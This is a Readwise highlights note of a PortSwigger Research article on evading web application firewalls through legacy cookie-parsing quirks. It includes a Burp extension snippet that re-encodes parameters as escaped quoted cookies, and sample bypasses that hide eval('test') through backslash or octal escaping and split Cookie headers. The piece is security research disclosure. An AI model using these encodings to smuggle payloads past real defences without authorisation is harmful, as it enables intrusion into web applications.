---
author: PortSwigger Research
aliases:
  - Bypassing WAFs With the Phantom $Version Cookie
tags:
  - readwise/articles
url: https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie
created: 2024-12-13
---
# Bypassing WAFs With the Phantom $Version Cookie

![rw-book-cover](https://portswigger.net/cms/images/5c/91/f7f8-twittercard-twitter-card-orange.png)

## Highlights


In this post, I'll explore some dangerous, lesser-known features of modern cookie parsers and show how they can be abused to bypass web application firewalls.
> [View Highlight](https://read.readwise.io/read/01jee9vb3y85785dz7jzndptjz)


# Downgrading cookie parsers with $Version

`Cookie: $Version=1; foo="bar"; $Path="/"; $Domain=abc;`
 
 `$Version` is a required attribute, identifying the version of the state management specification to which the cookie conforms.
> [View Highlight](https://read.readwise.io/read/01jee9xzhrabqhkzqv1vzwgvy0)

Modern frameworks analyze that header in the following ways:
```json
Flask: {"foo":"bar","$Version":"1","$Path":"/","$Domain":"abc"}
Django:{"foo":"bar","$Version":"1","$Path":"/","$Domain":"abc"}
PHP: {"foo":"\"bar\"","$Version":"1","$Path":"\"\/\"","$Domain":"abc"}
Ruby: {"foo":"\"bar\"","$Version":"1","$Path":"\"\/\"","$Domain":"abc"} 
Spring: { "foo": "\"bar\""} 
SimpleCookie: { "foo": "bar"}
```
> [View Highlight](https://read.readwise.io/read/01jee9zz0hv5t429grwvfq331s)


# Bypass Web Application Firewalls (WAFs)

Many WAFs are not equipped to detect the techniques described above, allowing malicious payloads to be hidden within quoted strings.

## Bypassing value analysis with quoted-string encoding

- semicolons (;), 
- commas (,), 
- newline characters (\n), 
- backslashes (\). 
 
While typically restricted in cookie values, these can sometimes be manipulated to trigger vulnerabilities. Implementing this type of quoted cookie encoding can be easily achieved using a Burp Suite extension with the [HttpHandler interface](https://github.com/PortSwigger/burp-extensions-montoya-api-examples/blob/main/httphandler/src/main/java/example/httphandler/MyHttpHandler.java)
> [View Highlight](https://read.readwise.io/read/01jeea3p8k7epvme79pdcyzt57)

```py
def handleHttpRequestToBeSent(requestToBeSent):
    result = "$Version=1; "
    for param in requestToBeSent.parameters:
        result += f"{param.name}=\""
        for char in param.value:
            result += f"\\{char}"
        result += "\"; "
    return continueWith(requestToBeSent.withAddedHeader("Cookie",result))
```

```
eval() => allowed 
eval('test') => forbidden 
"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed 
"\145\166\141\154\050\047\164\145\163\164\047\051" => allowed
```
> [View Highlight](https://read.readwise.io/read/01jeea48a1n0pjzk6cbtmr5895)


## Bypassing cookie-name blocklists

Another crucial aspect of RFC2109: a server should also accept a comma (,) as a separator between cookie values. This can be exploited to bypass simple WAF signatures that may not anticipate a cookie name being concealed within the value.

```
Cookie: $Version=1; foo=bar, abc = qux 
	=> "abc": "qux"
```
> [View Highlight](https://read.readwise.io/read/01jeea6002hx00t3a5zcp883jc)

## Bypassing value analysis with cookie splitting

Like many other HTTP headers, the Cookie header can be sent multiple times in a single request. The way how a server handles multiple identical headers may then vary
> [View Highlight](https://read.readwise.io/read/01jeea6twyzh2bdvwcdh3k1v5b)


```http
GET / HTTP/1.1 
Host: example.com 
Cookie: param1=value1; 
Cookie: param2=value2;
```

 Got the following back:
 
 ```
Flask: { "param1": "value1", ",param2": "value2"} 
Django: { "param1": "value1", ",param2": "value2"} 
PHP: { "param1": "value1", ",_param2": "value2"} 
Ruby: { "param1": "value1", ", param2": "value2"} 
Spring: { "param1": "value1", "param2": "value2"}
```
> [View Highlight](https://read.readwise.io/read/01jeea70mpgyecnyx8eqex1db3)

Quoted cookie values are also supported, which allows hiding malicious payloads by using the Cookie header as a multi-line header continuation.
> [View Highlight](https://read.readwise.io/read/01jeea879mnkznv34j8g8q01hc)

```
Cookie: name=eval('test') => forbidden 
Cookie: name=eval('test// 
Cookie: comment') 

Resulting cookie: name=eval('test//, comment') => allowed
```
> [View Highlight](https://read.readwise.io/read/01jeea9ft91pxrd342w3d72w33)

